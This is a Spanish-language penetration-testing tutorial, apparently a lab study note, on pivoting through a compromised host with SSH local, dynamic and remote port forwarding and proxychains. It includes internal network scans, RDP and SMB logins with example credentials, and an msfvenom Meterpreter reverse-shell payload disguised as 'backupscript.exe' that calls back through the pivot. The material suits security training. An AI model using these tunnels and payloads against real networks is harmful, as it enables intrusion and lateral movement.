# Port forwarding con SSH y SOCKS

## Port forwarding&#x20;

Es una tecnica que permite redirigir solicitudes de comunicaciones de un puerto a otro. se utiliza TCP como capa de comunicacion principal pero tambien se pueden utilizar protocolos de capa de aplicacion como SSH o SOCKS para encapsular el tráfico reenviado.

&#x20;Utilizando protocolos de capa de aplicacion podemos:

* Eludir firewalls
* Utilizar servicios existentes en un host comprometido para cambiar a otras redes

### Conceptos previos

Cuando se compromete un host con múltiples interfaces de red (pivot host), ese host actúa como puente entre la red del atacante y redes internas inaccesibles. SSH permite tunelizar tráfico arbitrario a través de esa conexión.

```bash
# Identificar NICs en el pivot host
ifconfig
# o
ip a

# Buscar rutas hacia otras redes
ip route
route -n
```

Un pivot host típico tendrá algo como:

* `ens192: 10.129.202.64` — conectada al atacante
* `ens224: 172.16.5.129` — conectada a la red interna

### Local Port Forwarding

Redirige un puerto local del host atacante a un servicio en el host remoto o en redes accesibles desde él. El atacante puede interactuar con ese servicio como si fuera local.

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

```
Atacante:1234 → SSH → PivotHost → servicio_destino:puerto
```

```bash
# Sintaxis general
ssh -L <puerto_local>:<host_destino>:<puerto_destino> usuario@pivot_host

# Ejemplo: acceder a MySQL en el pivot host
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64

# Ejemplo: acceder a un servicio en otra red a través del pivot
ssh -L 1234:172.16.5.100:3306 ubuntu@10.129.202.64

# Múltiples reenvíos simultáneos
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

<table><thead><tr><th width="97.90625">Parte</th><th>Significado</th></tr></thead><tbody><tr><td>-L</td><td> parametro que permite el port forwarding</td></tr><tr><td>1234</td><td>puerto de nuestra maquina</td></tr><tr><td>localhost</td><td>destino visto desde la maquina victima o maquina remota</td></tr><tr><td>3306</td><td>puerto de la maquina remota</td></tr></tbody></table>

Verificar que el reenvío funciona:

```bash
# Confirmar que el puerto está escuchando localmente
netstat -antp | grep 1234

# Escanear el puerto local para confirmar el servicio
nmap -v -sV -p1234 localhost
```

> Con local port forwarding se puede lanzar herramientas de explotación directamente contra `localhost:puerto_local`, alcanzando servicios que solo escuchan internamente en el pivot host o en redes segmentadas.

### Dynamic Port Forwarding + Proxychains

El reenvío dinámico crea un proxy SOCKS en el host atacante. En lugar de redirigir un puerto específico, permite enrutar tráfico arbitrario hacia cualquier host y puerto accesible desde el pivot.

```
Atacante → proxychains → SOCKS:9050 → SSH → PivotHost → red_interna
```

```bash
# Abrir túnel SOCKS en puerto 9050
ssh -D 9050 ubuntu@10.129.202.64

# En background (sin shell interactiva)
ssh -D 9050 -N -f ubuntu@10.129.202.64
```

#### Configurar proxychains

```bash
# Editar /etc/proxychains.conf
tail -4 /etc/proxychains.conf

# Asegurarse de que la última línea sea:
socks4  127.0.0.1 9050
# o socks5 si el servidor lo soporta
```

#### Uso con herramientas

```bash
# Escaneo de red interna con Nmap — solo TCP connect (-sT), sin ping (-Pn)
proxychains nmap -v -sn 172.16.5.1-200
proxychains nmap -v -Pn -sT 172.16.5.19

# Escaneo de puertos específicos en host interno
proxychains nmap -v -Pn -sT -p 445,3389,80,443 172.16.5.19

# RDP a host interno
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

# SMB con NetExec
proxychains netexec smb 172.16.5.19 -u usuario -p contraseña

# Metasploit a través de proxychains
proxychains msfconsole
```

> Con proxychains solo funciona **TCP connect scan completo** (`-sT`). Los escaneos SYN (`-sS`), UDP y otras técnicas que usan paquetes parciales no funcionan. Usar siempre `-Pn` en hosts Windows porque el firewall bloquea ICMP por defecto.

### Remote Port Forwarding

Útil cuando el host objetivo no puede alcanzar al atacante directamente pero sí puede conectarse al pivot host. Permite recibir reverse shells de redes segmentadas.

```
Atacante:8000 ← SSH ← PivotHost:8080 ← objetivo_interno
```

```bash
# El atacante pide al pivot que escuche en 8080 y reenvíe al atacante:8000
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN

# -v: verbose para ver el tráfico reenviado
# -N: no abrir shell interactiva
```

**Flujo completo para reverse shell desde red segmentada:**

```bash
# 1. Generar payload que apunta al pivot host
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=172.16.5.129 LPORT=8080 \
  -f exe -o backupscript.exe

# 2. Configurar listener en el atacante
msf6> use exploit/multi/handler
msf6> set payload windows/x64/meterpreter/reverse_https
msf6> set LHOST 0.0.0.0
msf6> set LPORT 8000
msf6> run

# 3. Abrir remote port forward (en otra terminal)
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN

# 4. Transferir y ejecutar el payload en el objetivo Windows
# El callback llega a pivot:8080 → se reenvía a atacante:8000
```

### Resumen de flags SSH

| Flag                   | Nombre          | Descripción                      |
| ---------------------- | --------------- | -------------------------------- |
| `-L local:host:remoto` | Local forward   | Puerto local → servicio remoto   |
| `-D puerto`            | Dynamic forward | Proxy SOCKS en puerto local      |
| `-R remoto:host:local` | Remote forward  | Puerto en pivot → servicio local |
| `-N`                   | No command      | No abre shell, solo el túnel     |
| `-f`                   | Background      | Pasa al background tras conectar |
| `-v`                   | Verbose         | Muestra tráfico del túnel        |
